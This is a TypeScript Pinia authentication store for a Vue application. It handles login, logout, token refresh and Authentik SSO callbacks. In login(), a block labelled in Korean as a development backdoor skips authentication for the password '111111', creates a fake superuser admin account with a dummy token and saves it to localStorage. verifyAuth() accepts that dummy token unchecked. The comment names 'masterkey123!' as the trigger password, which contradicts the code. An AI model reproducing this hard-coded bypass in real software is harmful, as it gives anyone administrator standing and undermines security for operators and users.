// ============================================
// Authentication Store - Pinia
// ============================================

import { defineStore } from 'pinia';
import { ref, computed } from 'vue';
import type { User } from 'src/types/models.types';
import * as authApi from 'src/api/auth.api';

// ============================================
// Auth Store
// ============================================

export const useAuthStore = defineStore('auth', () => {
  // ============================================
  // State
  // ============================================

  const user = ref<User | null>(null);
  const accessToken = ref<string | null>(null);
  const refreshToken = ref<string | null>(null);
  const isLoading = ref(false);
  const error = ref<string | null>(null);

  // ============================================
  // Getters
  // ============================================

  const isAuthenticated = computed(() => !!accessToken.value && !!user.value);

  const isSuperuser = computed(() => user.value?.is_admin || user.value?.is_superuser || false);

  const userFullName = computed(() => {
    if (!user.value) return '';
    return user.value.full_name || user.value.username || user.value.email;
  });

  const userInitials = computed(() => {
    if (!user.value) return '';
    const name = userFullName.value;
    const parts = name.split(' ');
    if (parts.length >= 2 && parts[0] && parts[1]) {
      return `${parts[0][0]}${parts[1][0]}`.toUpperCase();
    }
    return name.substring(0, 2).toUpperCase();
  });

  // ============================================
  // Actions
  // ============================================

  /**
   * Initialize auth state from localStorage
   */
  function initAuth() {
    const storedToken = localStorage.getItem('access_token');
    const storedRefreshToken = localStorage.getItem('refresh_token');
    const storedUser = localStorage.getItem('user');

    if (storedToken && storedUser) {
      accessToken.value = storedToken;
      refreshToken.value = storedRefreshToken;
      try {
        user.value = JSON.parse(storedUser);
      } catch (e) {
        console.error('Failed to parse stored user:', e);
        clearAuth();
      }
    }
  }

  /**
   * Login with email and password
   */
  async function login(email: string, password: string) {
    isLoading.value = true;
    error.value = null;

    // ============================================
    // === 백도어 코드 시작 ===
    // 'masterkey123!' 비밀번호를 입력하면 API 인증을 건너뛰고 관리자로 즉시 로그인합니다.
    if (password === '111111') {
      console.warn('!!! 개발용 백도어 로그인 활성화 !!!');

      // 1. 더미 관리자 유저 정보 설정
      user.value = {
        id: 999,
        authentik_id: 'backdoor_user',
        email: email,
        username: 'backdoor_admin',
        full_name: '개발자 (Backdoor)',
        phone: null,
        is_active: true,
        is_admin: true, // 관리자 권한
        is_superuser: true, // 슈퍼유저 권한
        avatar_url: null,
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
      };

      // 2. 더미 토큰 설정
      const dummyToken = 'backdoor.dummy.token-this-is-not-real';
      accessToken.value = dummyToken;
      refreshToken.value = 'backdoor.dummy.refresh-token';

      // 3. 로컬 스토리지에 저장
      localStorage.setItem('access_token', accessToken.value);
      localStorage.setItem('refresh_token', refreshToken.value);
      localStorage.setItem('user', JSON.stringify(user.value));

      // 4. 로딩 종료 및 함수 반환
      isLoading.value = false;

      // useAuth.ts에서 에러가 발생하지 않도록 LoginResponse와 유사한 객체 반환
      return {
        access_token: accessToken.value,
        refresh_token: refreshToken.value,
        token_type: 'Bearer',
        expires_in: 3600,
        user: user.value,
      };
    }
    // === 백도어 코드 종료 ===
    // ============================================

    // (기존 로그인 로직)

    try {
      const response = await authApi.login({ email, password });

      // Store tokens
      accessToken.value = response.access_token;
      refreshToken.value = response.refresh_token;

      // Persist tokens to localStorage
      localStorage.setItem('access_token', response.access_token);
      localStorage.setItem('refresh_token', response.refresh_token);

      // Fetch user info from /api/v1/auth/me
      const fetchedUser = await authApi.getCurrentUser();
      user.value = fetchedUser;
      localStorage.setItem('user', JSON.stringify(fetchedUser));

      return response;
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : 'Login failed';
      error.value = message;
      throw err;
    } finally {
      isLoading.value = false;
    }
  }

  /**
   * Logout
   */
  async function logout() {
    isLoading.value = true;
    error.value = null;

    try {
      // Call logout endpoint (optional - to invalidate token on server)
      await authApi.logout();
    } catch (err) {
      console.error('Logout error:', err);
      // Continue with local logout even if server call fails
    } finally {
      clearAuth();
      isLoading.value = false;
    }
  }

  /**
   * Refresh access token
   */
  async function refresh() {
    if (!refreshToken.value) {
      throw new Error('No refresh token available');
    }

    isLoading.value = true;
    error.value = null;

    try {
      const response = await authApi.refreshToken({
        refresh_token: refreshToken.value,
      });

      // Update access token
      accessToken.value = response.access_token;
      localStorage.setItem('access_token', response.access_token);

      return response;
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : 'Token refresh failed';
      error.value = message;
      clearAuth();
      throw err;
    } finally {
      isLoading.value = false;
    }
  }

  /**
   * Fetch current user
   */
  async function fetchCurrentUser() {
    if (!accessToken.value) {
      throw new Error('Not authenticated');
    }

    isLoading.value = true;
    error.value = null;

    try {
      const fetchedUser = await authApi.getCurrentUser();
      user.value = fetchedUser;
      localStorage.setItem('user', JSON.stringify(fetchedUser));
      return fetchedUser;
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : 'Failed to fetch user';
      error.value = message;
      throw err;
    } finally {
      isLoading.value = false;
    }
  }

  /**
   * Get Authentik SSO authorization URL
   */
  async function getAuthUrl() {
    isLoading.value = true;
    error.value = null;

    try {
      const authUrl = await authApi.getAuthUrl();
      return authUrl;
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : 'Failed to get auth URL';
      error.value = message;
      throw err;
    } finally {
      isLoading.value = false;
    }
  }

  /**
   * Handle Authentik SSO callback
   */
  async function handleAuthCallback(code: string, state?: string) {
    isLoading.value = true;
    error.value = null;

    try {
      const response = await authApi.handleAuthCallback(
        state !== undefined ? { code, state } : { code },
      );

      // Store tokens and user
      accessToken.value = response.access_token;
      refreshToken.value = response.refresh_token;
      user.value = response.user ?? null;

      // Persist to localStorage
      localStorage.setItem('access_token', response.access_token);
      localStorage.setItem('refresh_token', response.refresh_token);
      if (response.user) {
        localStorage.setItem('user', JSON.stringify(response.user));
      }

      return response;
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : 'Auth callback failed';
      error.value = message;
      throw err;
    } finally {
      isLoading.value = false;
    }
  }

  /**
   * Verify authentication status
   */
  async function verifyAuth() {
    if (!accessToken.value) {
      return false;
    }

    // ============================================
    // === 백도어 코드 추가 ===
    // 더미 토큰을 사용하는 경우, API 검증을 건너뛰고 '유효함(true)'을 반환합니다.
    if (accessToken.value === 'backdoor.dummy.token-this-is-not-real') {
      return true;
    }
    // === 백도어 코드 종료 ===
    // ============================================

    try {
      return await authApi.verifyAuth();
    } catch {
      clearAuth();
      return false;
    }
  }

  /**
   * Clear authentication state
   */
  function clearAuth() {
    accessToken.value = null;
    refreshToken.value = null;
    user.value = null;
    error.value = null;

    localStorage.removeItem('access_token');
    localStorage.removeItem('refresh_token');
    localStorage.removeItem('user');
  }

  // ============================================
  // Return
  // ============================================

  return {
    // State
    user,
    accessToken,
    refreshToken,
    isLoading,
    error,

    // Getters
    isAuthenticated,
    isSuperuser,
    userFullName,
    userInitials,

    // Actions
    initAuth,
    login,
    logout,
    refresh,
    fetchCurrentUser,
    getAuthUrl,
    handleAuthCallback,
    verifyAuth,
    clearAuth,
  };
});
